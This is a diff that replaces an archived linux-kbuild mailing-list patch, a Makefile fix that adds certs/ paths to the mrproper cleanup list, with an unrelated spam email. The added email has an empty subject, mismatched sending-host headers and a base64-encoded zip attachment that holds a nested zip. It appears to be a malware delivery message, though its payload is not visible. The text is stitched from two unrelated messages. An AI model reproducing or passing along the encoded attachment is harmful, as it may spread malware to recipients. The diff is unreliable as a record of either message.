@@ -1,48 +1,54 @@
 Return-Path: <linux-kbuild-owner@vger.kernel.org>
-Received: from mail-pg0-f49.google.com ([74.125.83.49]:33252 "EHLO
-        mail-pg0-f49.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752573AbdDNVyz (ORCPT
+Received: from 186.193.184.188.jupiter.com.br ([186.193.184.188]:2503 "HELO
+        jupiter.com.br" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1755847AbdDPPXR (ORCPT
         <rfc822;linux-kbuild@vger.kernel.org>);
-        Fri, 14 Apr 2017 17:54:55 -0400
-Received: by mail-pg0-f49.google.com with SMTP id x125so47954752pgb.0
-        for <linux-kbuild@vger.kernel.org>; Fri, 14 Apr 2017 14:54:55 -0700 (PDT)
-From: Stephen Hemminger <stephen@networkplumber.org>
-Subject: [PATCH 1/2] kbuild: cleanup signing keys with mrproper
-Date: Fri, 14 Apr 2017 14:54:49 -0700
-Message-Id: <20170414215450.18307-2-sthemmin@microsoft.com>
-In-Reply-To: <20170414215450.18307-1-sthemmin@microsoft.com>
-References: <20170414215450.18307-1-sthemmin@microsoft.com>
+        Sun, 16 Apr 2017 11:23:17 -0400
+MIME-Version: 1.0
+Message-ID: <149235617951.20709.1965507467277369174@jupiter.com.br>
+Content-Type: application/zip; name="EMAIL_4312620137_linux-kbuild.zip"
+Content-Transfer-Encoding: base64
+From: <mpinon@uach.mx>
+Subject: 
+Content-Disposition: attachment
+Date: Sun, 16 Apr 2017 15:22:59 -0000
 Sender: linux-kbuild-owner@vger.kernel.org
 List-ID: <linux-kbuild.vger.kernel.org>
-To: yamada.masahiro@socionext.com, mmarek@suse.com
-Cc: linux-kbuild@vger.kernel.org, linux-kernel@vger.kernel.org, Stephen Hemminger <sthemmin@microsoft.com>
+To: linux-kbuild <linux-kbuild@vger.kernel.org>
 
-When 'make mrproper' is run it was supposed to remove the signing
-keys in the certs directory, but only the filename is given
-rather than the pathanme which is necessary to cause cleanup.
-
-Signed-off-by: Stephen Hemminger <sthemmin@microsoft.com>
----
- Makefile | 6 +++---
- 1 file changed, 3 insertions(+), 3 deletions(-)
-
-diff --git a/Makefile b/Makefile
-index efa267a92ba6..04ca211552f7 100644
---- a/Makefile
-+++ b/Makefile
-@@ -1274,9 +1274,9 @@ MRPROPER_DIRS  += include/config usr/include include/generated          \
- 		  arch/*/include/generated .tmp_objdiff
- MRPROPER_FILES += .config .config.old .version .old_version \
- 		  Module.symvers tags TAGS cscope* GPATH GTAGS GRTAGS GSYMS \
--		  signing_key.pem signing_key.priv signing_key.x509	\
--		  x509.genkey extra_certificates signing_key.x509.keyid	\
--		  signing_key.x509.signer vmlinux-gdb.py
-+		  certs/signing_key.pem certs/signing_key.priv certs/signing_key.x509	\
-+		  certs/x509.genkey certs/extra_certificates certs/signing_key.x509.keyid \
-+		  certs/signing_key.x509.signer vmlinux-gdb.py
- 
- # clean - Delete most, but leave enough to build external modules
- #
--- 
-2.11.0
-
+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
